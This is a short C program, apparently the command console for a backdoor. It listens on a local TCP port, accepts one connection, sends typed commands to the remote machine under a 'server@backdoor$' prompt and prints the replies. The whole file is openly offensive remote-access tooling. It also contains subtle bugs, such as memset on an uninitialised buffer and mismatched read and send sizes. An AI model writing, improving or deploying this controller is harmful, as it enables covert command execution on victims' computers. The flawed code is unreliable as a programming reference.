#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#define LOCAL "127.0.0.1" // you should use only ipv4 here
#define PORT "4445"
struct term
{
	char pwd[256];
	int perm;
}shell;
int main(int argc, char*argv[])
{
	char buffer[300];
	int fdc;
	int fds;
	struct sockaddr_in cli;
	struct sockaddr_in serv;
	socklen_t tamanho = sizeof(cli);
	serv.sin_family = AF_INET;
	serv.sin_addr.s_addr = inet_addr(LOCAL);
	serv.sin_port = htons(atoi(PORT));
	if((inet_aton(LOCAL,&serv.sin_addr))!=1)
	{
		printf("\nincorrect IP\n");
		exit(1);
	}
	memset(serv.sin_zero,0,strlen(serv.sin_zero));
	fds = socket(AF_INET,SOCK_STREAM,0);
	if((bind(fds,(struct sockaddr *)&serv,sizeof(serv)))!=0)
	{
		printf("\nError Binding\n");
		exit(1);
	}
	printf("Listenig...\n");
	listen(fds,1);
	fdc = accept(fds,(struct sockaddr *)&cli,&tamanho);
	if(fdc == -1)
	{
		printf("Error trying accept client\n");
		exit(1);
	}
	printf("\nconected sucessifuly\n");
	memset(buffer,0,strlen(buffer));
	while(1)
	{
		printf("\nserver@backdoor$\\:");
		fgets(buffer,20,stdin);
		send(fdc,buffer,sizeof(buffer),0);
		printf("sent!\n");
		printf("wait...\n\n");
		memset(buffer,0,strlen(buffer));
		recv(fdc,buffer,sizeof(buffer),0);
		printf("%s",buffer);
		memset(buffer,0,strlen(buffer));
	}
	close(fdc);
	close(fds);
	printf("\nclosed conection\n");
	exit(1);
}
